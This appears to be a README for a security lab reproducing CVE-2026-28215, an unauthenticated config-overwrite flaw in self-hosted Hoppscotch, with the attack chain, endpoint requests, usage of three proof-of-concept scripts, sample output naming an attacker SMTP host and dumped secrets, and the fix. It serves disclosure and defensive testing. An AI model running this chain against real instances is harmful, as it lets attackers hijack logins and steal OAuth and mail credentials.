# CVE-2026-28215 - Hoppscotch Unauthenticated Infrastructure Config Overwrite and Secret Exfiltration

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-28215 |
| Component | [Hoppscotch](https://github.com/hoppscotch/hoppscotch) (self-hosted backend) |
| Type | CWE-284: Improper Access Control / CWE-287: Improper Authentication |
| CVSS | 9.1 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| EPSS | 0.1% (24.7th percentile) |
| Affected | All versions before 2026.2.0 |
| Fix | v2026.2.0 — commit [`a1be60d`](https://github.com/hoppscotch/hoppscotch/commit/a1be60da649296c9c94511499928b15f295c8a18) (PR [#5897](https://github.com/hoppscotch/hoppscotch/pull/5897)) |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

The `POST /v1/onboarding/config` endpoint in the Hoppscotch self-hosted backend has **no authentication guard** and performs **no check on whether onboarding has already been completed**. The controller is decorated with only `ThrottlerBehindProxyGuard` (rate limiting) — no JWT authentication, no admin authorization, no session validation:

```typescript
@Controller({ path: 'onboarding', version: '1' })
@UseGuards(ThrottlerBehindProxyGuard)  // ONLY rate limiting — NO auth
export class OnboardingController { ... }
```

An unauthenticated remote attacker can send a single HTTP POST request to overwrite the entire infrastructure configuration of a self-hosted Hoppscotch instance — including OAuth provider credentials (Google, GitHub, Microsoft), SMTP/mailer settings, callback URLs, and authentication provider lists. The endpoint returns a recovery token that can then be used with the equally unauthenticated `GET /v1/onboarding/config?token=<uuid>` endpoint to read back **all** infrastructure secrets in plaintext.

### Attack Chain

```
1. Recon: GET /v1/onboarding/status (unauthenticated) — confirms configured instance
2. Exploit: POST /v1/onboarding/config with attacker-controlled OAuth/SMTP config
3. Server overwrites all infra config, returns recovery token in 201 response
4. Exfiltrate: GET /v1/onboarding/config?token=<uuid> — all secrets in plaintext
5. Repeat: endpoint can be called unlimited times without authentication
```

### Attack Scenarios

- **SMTP Hijacking**: Overwrite SMTP settings with attacker mail server — all magic-link authentication emails routed through attacker infrastructure, enabling capture of login tokens for every user
- **OAuth Credential Injection**: Replace Google/GitHub/Microsoft OAuth client credentials and callback URLs — users redirected through attacker-controlled OAuth flows during SSO login
- **Secret Exfiltration**: Recovery token provides read access to all existing OAuth client secrets and SMTP passwords for lateral movement into connected services

### Fix

The fix (commit [`a1be60d`](https://github.com/hoppscotch/hoppscotch/commit/a1be60da649296c9c94511499928b15f295c8a18)) adds an onboarding state check before processing:

```typescript
const onboardingStatus = await this.infraConfigService.getOnboardingStatus();
if (onboardingStatus.right.onboardingCompleted && !onboardingStatus.right.canReRunOnboarding)
  throwHTTPErr({ message: ONBOARDING_CANNOT_BE_RERUN, statusCode: HttpStatus.BAD_REQUEST });
```

`canReRunOnboarding` is `true` only when `usersCount === 0` (empty database), so the endpoint is permanently blocked once any user account has been created after initial onboarding.

**Assessment:** The fix adequately prevents the core exploit. No bypass was identified.

## Lab Setup

### Architecture

```
┌────────────────────────────────────────────────────────────────┐
│  lab-net (bridge)                                              │
│                                                                │
│  ┌──────────────────────────┐  ┌───────────────────────────┐  │
│  │ cve-2026-28215-db        │  │ cve-2026-28215-vulnerable │  │
│  │ PostgreSQL 15             │◄─│ Hoppscotch v2026.1.1      │  │
│  │ Port: 5432 (internal)    │  │ Port: 3170 (host: 3170)   │  │
│  └──────────────────────────┘  └───────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2026-28215

# Clone the vulnerable version source
git clone --branch 2026.1.1 --depth 1 https://github.com/hoppscotch/hoppscotch.git source

# Build and start (first build takes several minutes)
docker compose build
docker compose up -d

# Wait ~25s for initialization (DB migrations + app init restart cycle)
sleep 25

# Run the exploit
python3 poc/poc.py localhost 3170

# Cleanup
docker compose down -v
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2026-28215-db` | Database | `postgres:15-bookworm` | — (internal) | PostgreSQL 15 metadata store |
| `cve-2026-28215-vulnerable` | Vulnerable target | `node:22-bookworm` (multi-stage) | `3170` | Hoppscotch backend v2026.1.1 |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| PostgreSQL | `postgres` | `testpass` |

## PoC Usage

Three PoC scripts are provided, all using **Python 3 stdlib only** (no external dependencies).

### PoC 1: SMTP Config Overwrite and Secret Exfiltration (`poc.py`)

The primary exploit. Demonstrates the full chain: reconnaissance, config overwrite with attacker SMTP settings, secret exfiltration via recovery token, and repeated exploitation.

```bash
python3 poc/poc.py <host> [port]

# Against the lab
python3 poc/poc.py localhost 3170
```

### Expected Output (Vulnerable)

```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-28215 — Hoppscotch Onboarding Bypass PoC         ║
║  Config Overwrite + Secret Exfiltration                     ║
║  Severity: CRITICAL (CVSS 9.1)                              ║
╚══════════════════════════════════════════════════════════════╝

Target: localhost:3170

═══ STEP 1: Reconnaissance ═══
[+] Status: 200 OK
    onboardingCompleted: True

═══ STEP 2: Configuration Overwrite (EXPLOIT) ═══
[+] Response Status: 201
[!!!] VULNERABILITY CONFIRMED — Config overwritten WITHOUT authentication!
[!!!] Recovery token received: e538a8b6-...

═══ STEP 3: Secret Exfiltration ═══
[!!!] ALL INFRASTRUCTURE SECRETS EXFILTRATED:
  MAILER_SMTP_HOST: evil-smtp.attacker.com
  MAILER_SMTP_PASSWORD: evil-password-s3cret!
  ...

═══ STEP 4: Verify Persistence ═══
[!!!] REPEATED EXPLOITATION CONFIRMED — New token: 6b2e1cf6-...

[+] CVE-2026-28215 CONFIRMED — Hoppscotch Onboarding Bypass
```

> **Note:** After running `poc.py`, the backend container restarts (~10-15 seconds). This is expected — Hoppscotch triggers `process.exit()` after config changes. The PoC waits automatically.

### PoC 2: OAuth Credential Hijacking (`poc_oauth_hijack.py`)

Overwrites OAuth credentials for all three providers (Google, GitHub, Microsoft) in a single request, then verifies via secret exfiltration.

```bash
python3 poc/poc_oauth_hijack.py <host> [port]
```

### PoC 3: Non-destructive Vulnerability Check (`poc_check.py`)

Checks if an instance is vulnerable **without modifying any configuration**. Safe for scanning.

```bash
python3 poc/poc_check.py <host> [port]
```

## Verification: Vulnerable vs Patched

| Step | Vulnerable (< 2026.2.0) | Patched (>= 2026.2.0) |
|---|---|---|
| `GET /v1/onboarding/status` | `200` with `onboardingCompleted: true` | `200` with `onboardingCompleted: true` |
| `POST /v1/onboarding/config` | `201` — config overwritten, token returned | `400` — `onboarding/cannot_be_rerun` |
| `GET /v1/onboarding/config?token=<uuid>` | `200` — all secrets in plaintext | N/A (no token obtained) |
| Repeated POST calls | Unlimited overwrites | Blocked |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — SMTP config overwrite + secret exfiltration + repeated exploitation |
| `poc/poc_oauth_hijack.py` | Vector 2 — OAuth credential hijacking (Google, GitHub, Microsoft) |
| `poc/poc_check.py` | Non-destructive vulnerability scanner |
| `Dockerfile.vulnerable` | Multi-stage build for Hoppscotch backend v2026.1.1 |
| `docker-compose.yml` | PostgreSQL + vulnerable backend orchestration |
| `entrypoint.sh` | Container entrypoint (DB wait, Prisma migrations, app start) |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab build documentation |
| `poc_verification_report.md` | PoC test results |

## References

- [GitHub Advisory GHSA-jwv8-867r-q9fg](https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-jwv8-867r-q9fg)
- [Fix Commit](https://github.com/hoppscotch/hoppscotch/commit/a1be60da649296c9c94511499928b15f295c8a18)
- [Fix PR #5897](https://github.com/hoppscotch/hoppscotch/pull/5897)
- [Release 2026.2.0](https://github.com/hoppscotch/hoppscotch/releases/tag/2026.2.0)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-28215)
- [Hoppscotch Repository](https://github.com/hoppscotch/hoppscotch)

## Timeline

| Date | Event |
|---|---|
| 2026-02-23 | Fix committed (`a1be60da`) and PR #5897 merged |
| 2026-02-26 | CVE-2026-28215 published |
| 2026-02-28 | Lab reproduction and PoC verification completed |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-28215 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
